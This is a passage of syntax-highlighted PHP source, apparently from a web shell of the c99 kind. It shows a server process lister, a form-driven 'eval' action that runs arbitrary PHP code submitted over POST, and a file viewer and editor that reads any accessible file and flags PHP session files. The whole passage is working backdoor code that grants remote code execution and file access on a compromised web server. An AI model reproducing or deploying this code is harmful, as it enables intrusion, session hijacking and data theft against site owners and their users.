          <span class="k">else</span> <span class="p">{</span> <span class="nv">$y</span> <span class="o">=</span> <span class="s2">&quot;&amp;lt;a href=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=&quot;</span><span class="o">.</span><span class="nv">$dspact</span><span class="o">.</span><span class="s2">&quot;&amp;d=&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$d</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;processes_sort=&quot;</span><span class="o">.</span><span class="nv">$k</span><span class="o">.</span><span class="s2">&quot;d</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;img src=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=img&amp;img=sort_asc</span><span class="se">\&quot;</span><span class="s2"> border=</span><span class="se">\&quot;</span><span class="s2">0</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;/a&amp;gt;&quot;</span><span class="p">;</span> <span class="p">}</span>
          <span class="k">if</span> <span class="p">(</span><span class="nv">$k</span> <span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="nb">count</span><span class="p">(</span><span class="nv">$head</span><span class="p">))</span> <span class="p">{</span><span class="nv">$k</span> <span class="o">=</span> <span class="nb">count</span><span class="p">(</span><span class="nv">$head</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">;}</span>
          <span class="k">for</span><span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nv">$i</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nb">count</span><span class="p">(</span><span class="nv">$head</span><span class="p">);</span><span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">if</span> <span class="p">(</span><span class="nv">$i</span> <span class="o">!=</span> <span class="nv">$k</span><span class="p">)</span> <span class="p">{</span> <span class="nv">$head</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span> <span class="o">=</span> <span class="s2">&quot;&amp;lt;a href=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=&quot;</span><span class="o">.</span><span class="nv">$dspact</span><span class="o">.</span><span class="s2">&quot;&amp;d=&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$d</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;processes_sort=&quot;</span><span class="o">.</span><span class="nv">$i</span><span class="o">.</span><span class="nv">$parsesort</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;b&amp;gt;&quot;</span><span class="o">.</span><span class="nb">trim</span><span class="p">(</span><span class="nv">$head</span><span class="p">[</span><span class="nv">$i</span><span class="p">])</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/b&amp;gt;&amp;lt;/a&amp;gt;&quot;</span><span class="p">;</span> <span class="p">}</span>
          <span class="p">}</span>
          <span class="nv">$prcs</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
          <span class="nb">unset</span><span class="p">(</span><span class="nv">$stack</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
          <span class="k">foreach</span> <span class="p">(</span><span class="nv">$stack</span> <span class="k">as</span> <span class="nv">$line</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$line</span><span class="p">))</span> <span class="p">{</span>
              <span class="nv">$line</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s2">&quot; &quot;</span><span class="p">,</span><span class="nv">$line</span><span class="p">);</span>
              <span class="nv">$line</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;.&quot;</span><span class="p">,</span><span class="s2">&quot;&quot;</span><span class="p">,</span><span class="nv">$line</span><span class="p">[</span><span class="mi">4</span><span class="p">]);</span>
              <span class="nv">$line</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">=</span> <span class="nb">intval</span><span class="p">(</span><span class="nv">$line</span><span class="p">[</span><span class="mi">4</span><span class="p">])</span> <span class="o">*</span> <span class="mi">1024</span><span class="p">;</span>
              <span class="nb">unset</span><span class="p">(</span><span class="nv">$line</span><span class="p">[</span><span class="mi">5</span><span class="p">]);</span>
              <span class="nv">$prcs</span><span class="p">[]</span> <span class="o">=</span> <span class="nv">$line</span><span class="p">;</span>
            <span class="p">}</span>
          <span class="p">}</span>
        <span class="p">}</span>
        <span class="nv">$head</span><span class="p">[</span><span class="nv">$k</span><span class="p">]</span> <span class="o">=</span> <span class="s2">&quot;&amp;lt;b&amp;gt;&quot;</span><span class="o">.</span><span class="nv">$head</span><span class="p">[</span><span class="nv">$k</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/b&amp;gt;&quot;</span><span class="o">.</span><span class="nv">$y</span><span class="p">;</span>
        <span class="nv">$v</span> <span class="o">=</span> <span class="nv">$processes_sort</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
        <span class="nb">usort</span><span class="p">(</span><span class="nv">$prcs</span><span class="p">,</span><span class="s2">&quot;tabsort&quot;</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="nv">$processes_sort</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&quot;d&quot;</span><span class="p">)</span> <span class="p">{</span> <span class="nv">$prcs</span> <span class="o">=</span> <span class="nb">array_reverse</span><span class="p">(</span><span class="nv">$prcs</span><span class="p">);</span> <span class="p">}</span>
        <span class="nv">$tab</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
        <span class="nv">$tab</span><span class="p">[]</span> <span class="o">=</span> <span class="nv">$head</span><span class="p">;</span>
        <span class="nv">$tab</span> <span class="o">=</span> <span class="nb">array_merge</span><span class="p">(</span><span class="nv">$tab</span><span class="p">,</span><span class="nv">$prcs</span><span class="p">);</span>
        <span class="k">echo</span> <span class="s2">&quot;&amp;lt;table class=explorer&amp;gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
        <span class="k">foreach</span><span class="p">(</span><span class="nv">$tab</span> <span class="k">as</span> <span class="nv">$i</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nv">$k</span><span class="p">)</span> <span class="p">{</span>
          <span class="k">echo</span> <span class="s2">&quot;&amp;lt;tr&amp;gt;&quot;</span><span class="p">;</span>
          <span class="k">foreach</span><span class="p">(</span><span class="nv">$k</span> <span class="k">as</span> <span class="nv">$j</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nv">$v</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">if</span> <span class="p">(</span><span class="nv">$win</span> <span class="k">and</span> <span class="nv">$i</span> <span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="mi">0</span> <span class="k">and</span> <span class="nv">$j</span> <span class="o">==</span> <span class="mi">4</span><span class="p">)</span> <span class="p">{</span> <span class="nv">$v</span> <span class="o">=</span> <span class="nx">view_size</span><span class="p">(</span><span class="nv">$v</span><span class="p">);</span> <span class="p">}</span>
            <span class="k">echo</span> <span class="s2">&quot;&amp;lt;td&amp;gt;&quot;</span><span class="o">.</span><span class="nv">$v</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/td&amp;gt;&quot;</span><span class="p">;</span>
          <span class="p">}</span>
          <span class="k">echo</span> <span class="s2">&quot;&amp;lt;/tr&amp;gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">echo</span> <span class="s2">&quot;&amp;lt;/table&amp;gt;&quot;</span><span class="p">;</span>
      <span class="p">}</span>
    <span class="p">}</span>
    <span class="k">if</span> <span class="p">(</span><span class="nv">$act</span> <span class="o">==</span> <span class="s2">&quot;eval&quot;</span><span class="p">)</span> <span class="p">{</span>
      <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$eval</span><span class="p">))</span> <span class="p">{</span>
        <span class="k">echo</span> <span class="s2">&quot;Result of execution this PHP-code:&amp;lt;br&amp;gt;&quot;</span><span class="p">;</span>
        <span class="nv">$tmp</span> <span class="o">=</span> <span class="o">@</span><span class="nb">ob_get_contents</span><span class="p">();</span>
        <span class="nv">$olddir</span> <span class="o">=</span> <span class="nb">realpath</span><span class="p">(</span><span class="s2">&quot;.&quot;</span><span class="p">);</span>
        <span class="o">@</span><span class="nb">chdir</span><span class="p">(</span><span class="nv">$d</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="nv">$tmp</span><span class="p">)</span> <span class="p">{</span>
          <span class="o">@</span><span class="nb">ob_clean</span><span class="p">();</span>
          <span class="k">eval</span><span class="p">(</span><span class="nv">$eval</span><span class="p">);</span>
          <span class="nv">$ret</span> <span class="o">=</span> <span class="o">@</span><span class="nb">ob_get_contents</span><span class="p">();</span>
          <span class="nv">$ret</span> <span class="o">=</span> <span class="nb">convert_cyr_string</span><span class="p">(</span><span class="nv">$ret</span><span class="p">,</span><span class="s2">&quot;d&quot;</span><span class="p">,</span><span class="s2">&quot;w&quot;</span><span class="p">);</span>
          <span class="o">@</span><span class="nb">ob_clean</span><span class="p">();</span>
          <span class="k">echo</span> <span class="nv">$tmp</span><span class="p">;</span>
          <span class="k">if</span> <span class="p">(</span><span class="nv">$eval_txt</span><span class="p">)</span> <span class="p">{</span>
            <span class="nv">$rows</span> <span class="o">=</span> <span class="nb">count</span><span class="p">(</span><span class="nb">explode</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\r\n</span><span class="s2">&quot;</span><span class="p">,</span><span class="nv">$ret</span><span class="p">))</span><span class="o">+</span><span class="mi">1</span><span class="p">;</span>
            <span class="k">if</span> <span class="p">(</span><span class="nv">$rows</span> <span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span> <span class="mi">10</span><span class="p">)</span> <span class="p">{</span><span class="nv">$rows</span> <span class="o">=</span> <span class="mi">10</span><span class="p">;}</span>
            <span class="k">echo</span> <span class="s2">&quot;&amp;lt;br&amp;gt;&amp;lt;textarea cols=</span><span class="se">\&quot;</span><span class="s2">115</span><span class="se">\&quot;</span><span class="s2"> rows=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$rows</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2"> readonly&amp;gt;&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$ret</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/textarea&amp;gt;&quot;</span><span class="p">;</span>
          <span class="p">}</span>
          <span class="k">else</span> <span class="p">{</span><span class="k">echo</span> <span class="nv">$ret</span><span class="o">.</span><span class="s2">&quot;&amp;lt;br&amp;gt;&quot;</span><span class="p">;}</span>
        <span class="p">}</span>
        <span class="k">else</span> <span class="p">{</span>
          <span class="k">if</span> <span class="p">(</span><span class="nv">$eval_txt</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">echo</span> <span class="s2">&quot;&amp;lt;br&amp;gt;&amp;lt;textarea cols=</span><span class="se">\&quot;</span><span class="s2">115</span><span class="se">\&quot;</span><span class="s2"> rows=</span><span class="se">\&quot;</span><span class="s2">15</span><span class="se">\&quot;</span><span class="s2"> readonly&amp;gt;&quot;</span><span class="p">;</span>
            <span class="k">eval</span><span class="p">(</span><span class="nv">$eval</span><span class="p">);</span>
            <span class="k">echo</span> <span class="s2">&quot;&amp;lt;/textarea&amp;gt;&quot;</span><span class="p">;</span>
          <span class="p">}</span>
          <span class="k">else</span> <span class="p">{</span><span class="k">echo</span> <span class="nv">$ret</span><span class="p">;}</span>
        <span class="p">}</span>
        <span class="o">@</span><span class="nb">chdir</span><span class="p">(</span><span class="nv">$olddir</span><span class="p">);</span>
      <span class="p">}</span>
      <span class="k">else</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot;&amp;lt;b&amp;gt;PHP-code Execution (Use without PHP Braces!)&amp;lt;/b&amp;gt;&quot;</span><span class="p">;</span> <span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$eval_txt</span><span class="p">))</span> <span class="p">{</span><span class="nv">$eval_txt</span> <span class="o">=</span> <span class="k">TRUE</span><span class="p">;}}</span>
      <span class="k">echo</span> <span class="s2">&quot;&amp;lt;form action=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2"> method=POST&amp;gt;&amp;lt;input type=hidden name=act value=eval&amp;gt;&amp;lt;textarea name=</span><span class="se">\&quot;</span><span class="s2">eval</span><span class="se">\&quot;</span><span class="s2"> cols=</span><span class="se">\&quot;</span><span class="s2">115</span><span class="se">\&quot;</span><span class="s2"> rows=</span><span class="se">\&quot;</span><span class="s2">10</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$eval</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/textarea&amp;gt;&amp;lt;input type=hidden name=</span><span class="se">\&quot;</span><span class="s2">d</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$dispd</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;&amp;lt;input type=submit value=</span><span class="se">\&quot;</span><span class="s2">Execute</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;nbsp;Display in text-area&amp;nbsp;&amp;lt;input type=</span><span class="se">\&quot;</span><span class="s2">checkbox</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">eval_txt</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">1</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="p">;</span> <span class="k">if</span> <span class="p">(</span><span class="nv">$eval_txt</span><span class="p">)</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot; checked&quot;</span><span class="p">;}</span> <span class="k">echo</span> <span class="s2">&quot;&amp;gt;&amp;lt;/form&amp;gt;&quot;</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">if</span> <span class="p">(</span><span class="nv">$act</span> <span class="o">==</span> <span class="s2">&quot;f&quot;</span><span class="p">)</span> <span class="p">{</span>
      <span class="k">echo</span> <span class="s2">&quot;&amp;lt;div align=left&amp;gt;&quot;</span><span class="p">;</span>
      <span class="k">if</span> <span class="p">((</span><span class="o">!</span><span class="nb">is_readable</span><span class="p">(</span><span class="nv">$d</span><span class="o">.</span><span class="nv">$f</span><span class="p">)</span> <span class="k">or</span> <span class="nb">is_dir</span><span class="p">(</span><span class="nv">$d</span><span class="o">.</span><span class="nv">$f</span><span class="p">))</span> <span class="k">and</span> <span class="nv">$ft</span> <span class="o">!=</span> <span class="s2">&quot;edit&quot;</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="nb">file_exists</span><span class="p">(</span><span class="nv">$d</span><span class="o">.</span><span class="nv">$f</span><span class="p">))</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot;&amp;lt;center&amp;gt;&amp;lt;b&amp;gt;Permision denied (&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$d</span><span class="o">.</span><span class="nv">$f</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;)!&amp;lt;/b&amp;gt;&amp;lt;/center&amp;gt;&quot;</span><span class="p">;}</span>
        <span class="k">else</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot;&amp;lt;center&amp;gt;&amp;lt;b&amp;gt;File does not exists (&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$d</span><span class="o">.</span><span class="nv">$f</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;)!&amp;lt;/b&amp;gt;&amp;lt;br&amp;gt;&amp;lt;a href=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=f&amp;f=&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$f</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;ft=edit&amp;d=&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$d</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;c=1</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;u&amp;gt;Create&amp;lt;/u&amp;gt;&amp;lt;/a&amp;gt;&amp;lt;/center&amp;gt;&quot;</span><span class="p">;}</span>
      <span class="p">}</span>
      <span class="k">else</span> <span class="p">{</span>
        <span class="nv">$r</span> <span class="o">=</span> <span class="o">@</span><span class="nb">file_get_contents</span><span class="p">(</span><span class="nv">$d</span><span class="o">.</span><span class="nv">$f</span><span class="p">);</span>
        <span class="nv">$ext</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s2">&quot;.&quot;</span><span class="p">,</span><span class="nv">$f</span><span class="p">);</span>
        <span class="nv">$c</span> <span class="o">=</span> <span class="nb">count</span><span class="p">(</span><span class="nv">$ext</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">;</span>
        <span class="nv">$ext</span> <span class="o">=</span> <span class="nv">$ext</span><span class="p">[</span><span class="nv">$c</span><span class="p">];</span>
        <span class="nv">$ext</span> <span class="o">=</span> <span class="nb">strtolower</span><span class="p">(</span><span class="nv">$ext</span><span class="p">);</span>
        <span class="nv">$rft</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span>
        <span class="k">foreach</span><span class="p">(</span><span class="nv">$ftypes</span> <span class="k">as</span> <span class="nv">$k</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nv">$v</span><span class="p">)</span> <span class="p">{</span><span class="k">if</span> <span class="p">(</span><span class="nb">in_array</span><span class="p">(</span><span class="nv">$ext</span><span class="p">,</span><span class="nv">$v</span><span class="p">))</span> <span class="p">{</span><span class="nv">$rft</span> <span class="o">=</span> <span class="nv">$k</span><span class="p">;</span> <span class="k">break</span><span class="p">;}}</span>
        <span class="k">if</span> <span class="p">(</span><span class="nb">eregi</span><span class="p">(</span><span class="s2">&quot;sess_(.*)&quot;</span><span class="p">,</span><span class="nv">$f</span><span class="p">))</span> <span class="p">{</span><span class="nv">$rft</span> <span class="o">=</span> <span class="s2">&quot;phpsess&quot;</span><span class="p">;}</span>
        <span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$ft</span><span class="p">))</span> <span class="p">{</span><span class="nv">$ft</span> <span class="o">=</span> <span class="nv">$rft</span><span class="p">;}</span>
        <span class="nv">$arr</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
            <span class="k">array</span><span class="p">(</span><span class="s2">&quot;&amp;lt;img src=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=img&amp;img=ext_diz</span><span class="se">\&quot;</span><span class="s2"> border=</span><span class="se">\&quot;</span><span class="s2">0</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&quot;</span><span class="p">,</span><span class="s2">&quot;info&quot;</span><span class="p">),</span>
            <span class="k">array</span><span class="p">(</span><span class="s2">&quot;&amp;lt;img src=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=img&amp;img=ext_html</span><span class="se">\&quot;</span><span class="s2"> border=</span><span class="se">\&quot;</span><span class="s2">0</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&quot;</span><span class="p">,</span><span class="s2">&quot;html&quot;</span><span class="p">),</span>
            <span class="k">array</span><span class="p">(</span><span class="s2">&quot;&amp;lt;img src=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=img&amp;img=ext_txt</span><span class="se">\&quot;</span><span class="s2"> border=</span><span class="se">\&quot;</span><span class="s2">0</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&quot;</span><span class="p">,</span><span class="s2">&quot;txt&quot;</span><span class="p">),</span>
            <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Code&quot;</span><span class="p">,</span><span class="s2">&quot;code&quot;</span><span class="p">),</span>
            <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Session&quot;</span><span class="p">,</span><span class="s2">&quot;phpsess&quot;</span><span class="p">),</span>
            <span class="k">array</span><span class="p">(</span><span class="s2">&quot;&amp;lt;img src=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=img&amp;img=ext_exe</span><span class="se">\&quot;</span><span class="s2"> border=</span><span class="se">\&quot;</span><span class="s2">0</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&quot;</span><span class="p">,</span><span class="s2">&quot;exe&quot;</span><span class="p">),</span>
            <span class="k">array</span><span class="p">(</span><span class="s2">&quot;SDB&quot;</span><span class="p">,</span><span class="s2">&quot;sdb&quot;</span><span class="p">),</span>
            <span class="k">array</span><span class="p">(</span><span class="s2">&quot;&amp;lt;img src=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=img&amp;img=ext_gif</span><span class="se">\&quot;</span><span class="s2"> border=</span><span class="se">\&quot;</span><span class="s2">0</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&quot;</span><span class="p">,</span><span class="s2">&quot;img&quot;</span><span class="p">),</span>
            <span class="k">array</span><span class="p">(</span><span class="s2">&quot;&amp;lt;img src=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=img&amp;img=ext_ini</span><span class="se">\&quot;</span><span class="s2"> border=</span><span class="se">\&quot;</span><span class="s2">0</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&quot;</span><span class="p">,</span><span class="s2">&quot;ini&quot;</span><span class="p">),</span>
            <span class="k">array</span><span class="p">(</span><span class="s2">&quot;&amp;lt;img src=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=img&amp;img=download</span><span class="se">\&quot;</span><span class="s2"> border=</span><span class="se">\&quot;</span><span class="s2">0</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&quot;</span><span class="p">,</span><span class="s2">&quot;download&quot;</span><span class="p">),</span>
            <span class="k">array</span><span class="p">(</span><span class="s2">&quot;&amp;lt;img src=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=img&amp;img=ext_rtf</span><span class="se">\&quot;</span><span class="s2"> border=</span><span class="se">\&quot;</span><span class="s2">0</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&quot;</span><span class="p">,</span><span class="s2">&quot;notepad&quot;</span><span class="p">),</span>
            <span class="k">array</span><span class="p">(</span><span class="s2">&quot;&amp;lt;img src=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=img&amp;img=change</span><span class="se">\&quot;</span><span class="s2"> border=</span><span class="se">\&quot;</span><span class="s2">0</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&quot;</span><span class="p">,</span><span class="s2">&quot;edit&quot;</span><span class="p">)</span>
        <span class="p">);</span>
        <span class="k">echo</span> <span class="s2">&quot;&amp;lt;b&amp;gt;Viewing file:&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;lt;img src=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=img&amp;img=ext_&quot;</span><span class="o">.</span><span class="nv">$ext</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2"> border=</span><span class="se">\&quot;</span><span class="s2">0</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;nbsp;&quot;</span><span class="o">.</span><span class="nv">$f</span><span class="o">.</span><span class="s2">&quot; (&quot;</span><span class="o">.</span><span class="nx">view_size</span><span class="p">(</span><span class="nb">filesize</span><span class="p">(</span><span class="nv">$d</span><span class="o">.</span><span class="nv">$f</span><span class="p">))</span><span class="o">.</span><span class="s2">&quot;) &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&quot;</span><span class="o">.</span><span class="nx">view_perms_color</span><span class="p">(</span><span class="nv">$d</span><span class="o">.</span><span class="nv">$f</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/b&amp;gt;&amp;lt;br&amp;gt;Select action/file-type:&amp;lt;br&amp;gt;&quot;</span><span class="p">;</span>
        <span class="k">foreach</span><span class="p">(</span><span class="nv">$arr</span> <span class="k">as</span> <span class="nv">$t</span><span class="p">)</span> <span class="p">{</span>
          <span class="k">if</span> <span class="p">(</span><span class="nv">$t</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="nv">$rft</span><span class="p">)</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot; &amp;lt;a href=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=f&amp;f=&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$f</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;ft=&quot;</span><span class="o">.</span><span class="nv">$t</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&amp;d=&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$d</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;font color=green&amp;gt;&quot;</span><span class="o">.</span><span class="nv">$t</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/font&amp;gt;&amp;lt;/a&amp;gt;&quot;</span><span class="p">;}</span>
          <span class="k">elseif</span> <span class="p">(</span><span class="nv">$t</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="nv">$ft</span><span class="p">)</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot; &amp;lt;a href=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=f&amp;f=&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$f</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;ft=&quot;</span><span class="o">.</span><span class="nv">$t</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&amp;d=&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$d</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;b&amp;gt;&amp;lt;u&amp;gt;&quot;</span><span class="o">.</span><span class="nv">$t</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/u&amp;gt;&amp;lt;/b&amp;gt;&amp;lt;/a&amp;gt;&quot;</span><span class="p">;}</span>
          <span class="k">else</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot; &amp;lt;a href=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=f&amp;f=&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$f</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;ft=&quot;</span><span class="o">.</span><span class="nv">$t</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&amp;d=&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$d</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;b&amp;gt;&quot;</span><span class="o">.</span><span class="nv">$t</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/b&amp;gt;&amp;lt;/a&amp;gt;&quot;</span><span class="p">;}</span>
